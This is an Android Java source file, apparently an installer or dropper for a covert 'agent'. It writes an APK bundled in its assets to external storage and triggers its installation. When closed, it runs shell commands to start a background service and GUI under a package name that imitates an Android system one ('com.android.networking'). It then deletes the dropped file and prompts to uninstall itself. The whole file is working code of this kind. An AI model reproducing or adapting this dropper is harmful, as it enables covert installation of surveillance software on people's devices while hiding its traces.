package com.android.agentinstaller;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.StringWriter;
import java.io.Writer;

import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.app.Activity;
import android.content.Intent;
import android.content.res.AssetManager;
import android.content.res.Resources;
import android.util.Log;
import android.view.Menu;
import android.view.View;

public class InstallActivity extends Activity {

	private static final String TAG = "QZ";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_install_activity);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.activity_install_activty, menu);
		return true;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		try {
			Log.d(TAG, "starting activity");
			Process p = Runtime.getRuntime().exec("am start com.android.networking/.gui.HGui");
			String output = inputStreamToString(p.getInputStream());
			Log.w(TAG, output);
			String error = inputStreamToString(p.getErrorStream());
			Log.e(TAG, error);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		try {
			Log.d(TAG, "starting service");
			Process p = Runtime.getRuntime().exec("am startservice com.android.networking/.ServiceMain");
			String output = inputStreamToString(p.getInputStream());
			Log.w(TAG, output);
			String error = inputStreamToString(p.getErrorStream());
			Log.e(TAG, error);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		File assetDestination = new File(Environment.getExternalStorageDirectory() + "/i.apk");
		if (assetDestination.exists()) {
			assetDestination.delete();
		}

		Uri packageURI = Uri.parse("package:" + getApplicationContext().getPackageName());
		Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
		startActivity(uninstallIntent);
	}

	public void installAgent(View view) {
		Log.d(TAG, "install agent");

		File assetDestination = new File(Environment.getExternalStorageDirectory() + "/i.apk");
		byte[] content = loadAsset("installer.v2.apk");
		FileOutputStream f;
		try {
			f = new FileOutputStream(assetDestination);
			f.write(content, 0, content.length);

			Intent intent = new Intent(Intent.ACTION_VIEW);
			intent.setDataAndType(Uri.fromFile(assetDestination), "application/vnd.android.package-archive");
			startActivity(intent);

		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public byte[] loadAsset(String resource) {
		try {
			AssetManager assetManager = getAssets();
			InputStream in_s = assetManager.open(resource);

			byte[] b = new byte[in_s.available()];
			in_s.read(b);
			return b;
		} catch (Exception e) {
			e.printStackTrace();
			return new byte[0];
		}
	}

	public static String inputStreamToString(InputStream is) throws IOException {
		if (is != null) {
			Writer writer = new StringWriter();

			char[] buffer = new char[1024];
			try {
				Reader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
				int n;
				while ((n = reader.read(buffer)) != -1) {
					writer.write(buffer, 0, n);
				}
			} finally {
				is.close();
			}
			return writer.toString();
		} else {
			return "";
		}
	}

}
